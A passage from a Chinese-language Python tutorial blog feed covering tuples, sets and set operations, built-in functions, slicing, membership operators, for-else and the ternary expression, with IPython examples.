class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">## 循环遍历</span><br><span class="line"></span><br><span class="line">* **取值** 就是从 **元组** 中获取存储在指定位置的数据</span><br><span class="line">* **遍历** 就是 **从头到尾** **依次** 从 **元组** 中获取数据</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line"># for 循环内部使用的变量 in 元组</span><br><span class="line">for item in info:</span><br><span class="line"></span><br><span class="line">    循环内部针对元组元素进行操作</span><br><span class="line">    print(item)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><ul><li>在 <code>Python</code> 中，可以使用 <code>for</code>循环遍历所有非数字型类型的变量：<strong>列表</strong>、<strong>元组</strong>、<strong>字典</strong>以及 <strong>字符串</strong></li><li>提示：在实际开发中，除非<strong>能够确认元组中的数据类型</strong>，否则针对元组的循环遍历需求并不是很多</li></ul></blockquote><h2 id="应用场景-1">应用场景</h2><ul><li>尽管可以使用 <code>for in</code> 遍历 <strong>元组</strong></li><li>但是在开发中，更多的应用场景是：<ul><li>元组一般存储不同类型的数据</li><li><strong>函数的 参数 和 返回值</strong>，一个函数可以接收<strong>任意多个参数</strong>，或者 <strong>一次返回多个数据</strong><ul><li>有关 <strong>函数的参数 和 返回值</strong>，在后续<strong>函数高级</strong> 给大家介绍</li></ul></li><li><strong>格式字符串</strong>，格式化字符串 % 后面的 <code>()</code>本质上就是一个元组</li><li><strong>让列表不可以被修改</strong>，即：将列表转换为元组，从而达到保护数据安全的目的。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">info = (<span class="string">&quot;zhangsan&quot;</span>, <span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;info[<span class="number">0</span>]&#125;</span> 的年龄是<span class="subst">&#123;info[<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line">zhangsan 的年龄是<span class="number">18</span></span><br></pre></td></tr></table></figure><h2 id="格式化字符串中的元组">格式化字符串中的元组</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">infor_tuple=(<span class="string">&quot;小明&quot;</span>， <span class="number">21</span>， <span class="number">1.78</span>)</span><br><span class="line"><span class="comment"># 格式化字符串后面的 () 本质上就是元组</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%s 年龄是 %d， 身高是 %.2f&quot;</span> % info_tuple)</span><br><span class="line">info_str = <span class="string">&quot;%s 年龄是 %d， 身高是 %.2f&quot;</span> % info_tuple</span><br><span class="line"><span class="built_in">print</span>(info_str)</span><br></pre></td></tr></table></figure><h3 id="元组和列表之间的转换">元组和列表之间的转换</h3><ul><li>使用 <code>list</code> 函数可以把元组转换成列表</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span>(元组)</span><br></pre></td></tr></table></figure><ul><li>使用 <code>tuple</code> 函数可以把列表转换成元组</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tuple</span>(列表)</span><br></pre></td></tr></table></figure><h1 id="集合">集合</h1><p>Basically, sets are used for <strong>membership testing</strong> and<strong>eliminating duplicate entries</strong>。</p><p>一般有重复的数据，不要求去重的时候，不使用集合，可以使用列表遍历进行操作。</p><ol start="0" type="1"><li><p>注意去重时，长度变化了，看你需要之前的长度，还是需要 len重新计算一下长度。</p></li><li><p>可以使用大括号 <code>&#123; &#125;</code> 或者 <code>set()</code>函数创建集合，注意：创建一个空集合必须用 <code>set()</code> 而不是<code>&#123; &#125;</code> ，因为 <code>&#123; &#125;</code> 是用来创建一个空字典。</p><p>创建格式：</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">parame = &#123;value01,value02,...&#125;</span><br><span class="line">或者</span><br><span class="line"><span class="built_in">set</span>(value)</span><br></pre></td></tr></table></figure></p></li><li><p>集合只能容纳 immutable datatype，不能容纳诸如：列表、集合、字典等可变数据类型。</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>myset = &#123;<span class="number">1</span>,<span class="number">2</span>,[<span class="number">1</span>,<span class="number">2</span>],<span class="string">&quot;w&quot;</span>&#125;</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: unhashable <span class="built_in">type</span>: <span class="string">&#x27;list&#x27;</span></span><br></pre></td></tr></table></figure></p></li></ol><h2 id="常用操作">常用操作</h2><ol type="1"><li><p><code>set.add(x)</code> x 只能为一个不可变元素</p></li><li><p><code>set.remove(x)</code> 将元素 x 从集合 s中移除，如果元素不存在，则会发生错误。</p></li><li><p><code>set.discard(x)</code>移除集合中的元素，且如果元素不存在，不会发生错误。</p></li><li><p><code>set.update(iterable)</code></p><p>将可迭代对象的元素加入到调用者集合，并去重。</p><p>Parameters: This method accepts iterable (list, tuple, dictionaryetc.) as parameters. Return Value: It does not return anything, it justupdates the calling Set.</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">20</span>]: set1 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">21</span>]: set2 = &#123;<span class="number">3</span>,<span class="number">4</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">22</span>]: set2.update(set1)</span><br><span class="line"></span><br><span class="line">In [<span class="number">23</span>]: set2</span><br><span class="line">Out[<span class="number">23</span>]: &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br></pre></td></tr></table></figure></p></li></ol><h2 id="集合运算">集合运算</h2><ol type="1"><li><p><code>union()</code> 或 <code>|</code></p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">36</span>]: set1, set2</span><br><span class="line">Out[<span class="number">36</span>]: (&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;, &#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;)</span><br><span class="line">In [<span class="number">37</span>]: set1 | set2</span><br><span class="line">Out[<span class="number">37</span>]: &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">38</span>]: <span class="built_in">print</span>(set1.union(set2))</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br></pre></td></tr></table></figure></p></li><li><p><code>intersection()</code> 或 <code>&amp;</code></p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">39</span>]: set1 &amp; set2</span><br><span class="line">Out[<span class="number">39</span>]: &#123;<span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">40</span>]: set1.intersection(set2)</span><br><span class="line">Out[<span class="number">40</span>]: &#123;<span class="number">2</span>, <span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure></p></li><li><p><code>difference()</code> 或 <code>-</code></p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">41</span>]: set1 - set2</span><br><span class="line">Out[<span class="number">41</span>]: &#123;<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">42</span>]: set1.difference(set2)</span><br><span class="line">Out[<span class="number">42</span>]: &#123;<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure></p></li><li><p><code>symmetric_difference()</code> 或 <code>^</code></p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">43</span>]: set1.symmetric_difference(set2)</span><br><span class="line">Out[<span class="number">43</span>]: &#123;<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">44</span>]: set1 ^ set2</span><br><span class="line">Out[<span class="number">44</span>]: &#123;<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br></pre></td></tr></table></figure></p></li></ol><h1 id="公共方法">公共方法</h1><p>字符串、列表、元组、字典都可以使用的方法。</p><h2 id="python-内置函数">Python 内置函数</h2><p>Python 包含了以下内置函数：</p><table><colgroup><col style="width: 21%" /><col style="width: 41%" /><col style="width: 37%" /></colgroup><thead><tr class="header"><th>函数</th><th>描述</th><th>备注</th></tr></thead><tbody><tr class="odd"><td>len(item)</td><td>计算容器中元素个数</td><td></td></tr><tr class="even"><td>del(item)</td><td>删除变量</td><td>del 有两种方式: 关键字、函数</td></tr><tr class="odd"><td>max(item)</td><td>返回容器中元素最大值</td><td>如果是字典，只针对 key 比较</td></tr><tr class="even"><td>min(item)</td><td>返回容器中元素最小值</td><td>如果是字典，只针对 key 比较</td></tr><tr class="odd"><td>cmp(item1, item2)</td><td>比较两个值，-1 小于/0 相等/1 大于</td><td><strong>Python 3.x 取消了 cmp 函数</strong></td></tr></tbody></table><h3 id="del-方法关键字">del 方法/关键字:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">In [<span class="number">2</span>]: <span class="keyword">del</span> a[<span class="number">2</span>]</span><br><span class="line">In [<span class="number">3</span>]: a</span><br><span class="line">Out[<span class="number">3</span>]: [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: <span class="keyword">del</span>(a[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: a</span><br><span class="line">Out[<span class="number">5</span>]: [<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: <span class="keyword">del</span>(a)</span><br><span class="line">In [<span class="number">7</span>]: a</span><br><span class="line">------------------------------------------------------------------------mathjax: true</span><br><span class="line">---NameError                                 Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">7</span>-3f786850e387&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> a</span><br><span class="line"></span><br><span class="line">NameError: name <span class="string">&#x27;a&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure><h3 id="maxmin-方法关键字">max/min 方法关键字:</h3><p>注意: max/min 是针对字典的 key 进行统计比较</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">18</span>]: t_dict = &#123;<span class="string">&quot;z&quot;</span>:<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;a&quot;</span>:<span class="string">&quot;world&quot;</span>&#125;</span><br><span class="line">In [<span class="number">19</span>]: <span class="built_in">max</span>(t_dict)</span><br><span class="line">Out[<span class="number">19</span>]: <span class="string">&#x27;z&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">20</span>]: <span class="built_in">min</span>(t_dict)</span><br><span class="line">Out[<span class="number">20</span>]: <span class="string">&#x27;a&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="比较">比较</h3><p>使用比较运算符进行字符串、列表、元组的比较。</p><ul><li><strong>字符串</strong> 根据 ASCII 码比较： "0" &lt; "A" &lt;"a"</li><li>列表、元组是逐个对应元素进行比较</li><li>没有字典比较的需求。字典之间不能比较，字典是无序的。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">24</span>]: <span class="string">&quot;12&quot;</span> &gt; <span class="string">&quot;23&quot;</span></span><br><span class="line">Out[<span class="number">24</span>]: <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">25</span>]: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]&lt;[<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>]</span><br><span class="line">Out[<span class="number">25</span>]: <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">26</span>]: (<span class="number">9</span>,<span class="number">3</span>,<span class="number">1</span>)&lt;(<span class="number">1</span>,<span class="number">4</span>,<span class="number">10</span>)</span><br><span class="line">Out[<span class="number">26</span>]: <span class="literal">False</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="切片">切片</h2><div class="line-block">描述 | Python 表达式 | 结果 | 支持的数据类型|<br />:---: | ------------------ | ------- | ------------------ | |<br />切片 | "0123456789"[::-2] | "97531" | 字符串、列表、元组 |</div><ul><li><strong>切片</strong> 使用 <strong>索引值</strong>来限定范围，从一个大的 <strong>字符串</strong> 中 <strong>切出</strong>小的 <strong>字符串</strong></li><li><strong>列表</strong> 和 <strong>元组</strong> 都是<strong>有序</strong> 的集合，都能够 <strong>通过索引值</strong>获取到对应的数据</li><li><strong>字典</strong> 是一个 <strong>无序</strong> 的集合，是使用<strong>键值对</strong>保存数据，字典无序，没有索引的概念，也就不存在切片。</li></ul><h2 id="切片超出索引不报错">切片超出索引不报错</h2><p>当我们直接以索引值来访问 collection 的元素时，如果超出范围会报错但是可切片的对象(有索引的对象)在切片中的索引超出范围时，不会报错。这样就不用考虑边界问题了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">13</span>]: text = <span class="string">&quot;hello&quot;</span></span><br><span class="line">In [<span class="number">18</span>]: text[<span class="number">10</span>]</span><br><span class="line">------------------------------------------------------------------------mathjax: true</span><br><span class="line">---IndexError                                Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">18</span>-e38b07adaaf8&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> text[<span class="number">10</span>]</span><br><span class="line"></span><br><span class="line">IndexError: string index out of rang</span><br><span class="line"></span><br><span class="line">In [<span class="number">14</span>]: text[<span class="number">3</span>:<span class="number">10</span>]</span><br><span class="line">Out[<span class="number">14</span>]: <span class="string">&#x27;lo&#x27;</span></span><br></pre></td></tr></table></figure><p>列表，元组和上面一样。</p><p><ahref="https://www.hackerrank.com/challenges/text-wrap/problem">例题text-wrap</a> 知识点：</p><ol type="1"><li>range 的 step 参数</li><li>切片超出范围不报错</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">wrap</span>(<span class="params">string, max_width</span>):</span><br><span class="line">    str_len = <span class="built_in">len</span>(string)</span><br><span class="line">    <span class="keyword">for</span>  i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,str_len,max_width):</span><br><span class="line">        <span class="built_in">print</span>(string[i:i+max_width])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    string, max_width = <span class="built_in">input</span>(), <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    result = wrap(string, max_width)</span><br></pre></td></tr></table></figure><h2 id="判断序列是否空">判断序列是否空</h2><p>PEP8 里面推荐的判断非空的方法: <code>if seq</code> python 在求sequence (string, list, tuple) 的 bool 值的时候会把空的给 evaluate 成False。</p><p>For sequences, (strings, lists, tuples), use the fact that emptysequences are false.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Yes: <span class="keyword">if</span> <span class="keyword">not</span> seq:</span><br><span class="line">     <span class="keyword">if</span> seq:</span><br><span class="line"></span><br><span class="line">No:  <span class="keyword">if</span> <span class="built_in">len</span>(seq):</span><br><span class="line">     <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(seq):</span><br></pre></td></tr></table></figure><p><ahref="https://www.python.org/dev/peps/pep-0008/#programming-recommendations">PEP0008 -- Style Guide for Python Code</a></p><h2 id="运算符">运算符</h2><table><colgroup><col style="width: 12%" /><col style="width: 21%" /><col style="width: 28%" /><col style="width: 14%" /><col style="width: 24%" /></colgroup><thead><tr class="header"><th style="text-align: center;">运算符</th><th>Python 表达式</th><th>结果</th><th>描述</th><th>支持的数据类型</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">+</td><td>[1, 2] + [3, 4]</td><td>[1, 2, 3, 4]</td><td>合并</td><td>字符串、列表、元组</td></tr><tr class="even"><td style="text-align: center;">*</td><td>["Hi!"] * 4</td><td>['Hi!', 'Hi!', 'Hi!', 'Hi!']</td><td>重复</td><td>字符串、列表、元组</td></tr><tr class="odd"><td style="text-align: center;">in</td><td>3 in (1, 2, 3)</td><td>True</td><td>元素是否存在</td><td>字符串、列表、元组、字典</td></tr><tr class="even"><td style="text-align: center;">not in</td><td>4 not in (1, 2, 3)</td><td>True</td><td>元素是否不存在</td><td>字符串、列表、元组、字典</td></tr><tr class="odd"><td style="text-align: center;">&gt; &gt;= == &lt; &lt;=</td><td>(1, 2, 3) &lt; (2, 2, 3)</td><td>True</td><td>元素比较</td><td>字符串、列表、元组</td></tr></tbody></table><p><code>+</code> 与 <code>extend</code> 的区别:</p><p><code>+</code> 不改变原列表，生成一个新的列表，extend直接扩展改变原列表, 不生成新列表。当然, append 方法也是修改原列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">48</span>]: t_list</span><br><span class="line">Out[<span class="number">48</span>]: [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">49</span>]: t_list+[<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">Out[<span class="number">49</span>]: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">50</span>]: t_list</span><br><span class="line">Out[<span class="number">50</span>]: [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">51</span>]: t_list.extend([<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">In [<span class="number">52</span>]: t_list</span><br><span class="line">Out[<span class="number">52</span>]: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure><p><strong>注意</strong></p><ul><li><code>in / not in</code> 在对 <strong>字典</strong> 操作时，判断的是<strong>字典的键</strong></li><li><code>in</code> 和 <code>not in</code> 被称为<strong>成员运算符</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">56</span>]: <span class="string">&quot;name&quot;</span> <span class="keyword">in</span> &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;laowang&quot;</span>&#125;</span><br><span class="line">Out[<span class="number">56</span>]: <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">57</span>]: <span class="string">&quot;laowang&quot;</span> <span class="keyword">in</span> &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;laowang&quot;</span>&#125;</span><br><span class="line">Out[<span class="number">57</span>]: <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="成员运算符">成员运算符</h4><p>成员运算符用于 <strong>测试</strong> 序列中是否包含指定的<strong>成员</strong></p><table><colgroup><col style="width: 6%" /><col style="width: 57%" /><col style="width: 35%" /></colgroup><thead><tr class="header"><th>运算符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr class="odd"><td>in</td><td>如果在指定的序列中找到值返回 True，否则返回 False</td><td><code>3 in (1, 2, 3)</code> 返回 <code>True</code></td></tr><tr class="even"><td>not in</td><td>如果在指定的序列中没有找到值返回 True，否则返回 False</td><td><code>3 not in (1, 2, 3)</code> 返回 <code>False</code></td></tr></tbody></table><p>注意：在对 <strong>字典</strong> 操作时，判断的是<strong>字典的键</strong></p><h1 id="完整的-for-循环语法"><del>完整的 for 循环语法</del></h1><p>Notice: 《Effective Python》不建议使用该语法, 不要在 for 和 while循环后面写 else 块</p><ul><li>在 <code>Python</code> 中完整的 <code>for 循环</code>的语法如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> 变量 <span class="keyword">in</span> 集合:</span><br><span class="line"></span><br><span class="line">    循环体代码</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    没有通过 <span class="keyword">break</span> 退出循环，循环结束后，会执行的代码</span><br></pre></td></tr></table></figure><p>当集合遍历完成后， <code>else</code> 代码块就会被执行。 如果中途通过<code>break</code> 退出循环，导致集合未遍历完成，那么 <code>else</code>代码块就不会被执行。</p><p>可以看出，else内的语句会在循环语句结束后立即执行。但是很奇怪，为什么叫 else 呢？</p><p>常用的 else 如 if/else，try/except/else等都是前面的代码块不执行才执行 else语句。所以不熟悉此语法的人可能会误认为：如果循环没有正常执行完，那就执行else 块。但实际上正好相反，循环正常执行完会立即执行 else代码块；在循环里用 break 跳出(即使是最后一个循环break)，会导致程序不执行 else。</p><p><strong>因此，循环后面的 else代码块没有必要且容易引起歧义，尽量不要使用。</strong></p><h2 id="应用场景-2"><del>应用场景</del></h2><ul><li>在 <strong>迭代遍历</strong> 嵌套的数据类型时，例如<strong>一个列表包含了多个字典</strong></li><li>需求：要判断 某一个字典中 是否存在 指定的 值<ul><li>如果 <strong>存在</strong>，提示并且退出循环</li><li>如果 <strong>不存在</strong>，在 <strong>循环整体结束</strong>后，希望 <strong>得到一个统一的提示</strong></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">students = [</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;阿土&quot;</span>,</span><br><span class="line">     <span class="string">&quot;age&quot;</span>: <span class="number">20</span>,</span><br><span class="line">     <span class="string">&quot;gender&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">     <span class="string">&quot;height&quot;</span>: <span class="number">1.7</span>,</span><br><span class="line">     <span class="string">&quot;weight&quot;</span>: <span class="number">75.0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;小美&quot;</span>,</span><br><span class="line">     <span class="string">&quot;age&quot;</span>: <span class="number">19</span>,</span><br><span class="line">     <span class="string">&quot;gender&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">     <span class="string">&quot;height&quot;</span>: <span class="number">1.6</span>,</span><br><span class="line">     <span class="string">&quot;weight&quot;</span>: <span class="number">45.0</span>&#125;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">find_name = <span class="string">&quot;阿土&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> stu_dict <span class="keyword">in</span> students:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(stu_dict)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断当前遍历的字典中姓名是否为find_name</span></span><br><span class="line">    <span class="keyword">if</span> stu_dict[<span class="string">&quot;name&quot;</span>] == find_name:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;找到了&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果已经找到，直接退出循环，就不需要再对后续的数据进行比较</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;没有找到&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;循环结束&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="补充">补充</h1><p>Python 中三元运算符的写法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">9</span>]: a=<span class="number">3</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: b=<span class="number">8</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">13</span>]: <span class="number">3</span> <span class="keyword">if</span> a&gt;b <span class="keyword">else</span> <span class="number">5</span>        <span class="comment">#  如果 a &gt; b, 返回 3，否则返回 5</span></span><br><span class="line">Out[<span class="number">13</span>]: <span class="number">5</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: c= <span class="number">3</span> <span class="keyword">if</span> a&gt;b <span class="keyword">else</span> <span class="number">5</span>     <span class="comment"># 如果 a&gt;b, 则 c=3， 否则 c= 5</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">12</span>]: c</span><br><span class="line">Out[<span class="number">12</span>]: <span class="number">5</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> collections </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 字典</title>
      <link href="/blog/2020/03/21/programming/python/1.basic/3.dict/"/>
      <url>/blog/2020/03/21/programming/python/1.basic/3.dict/</url>
      
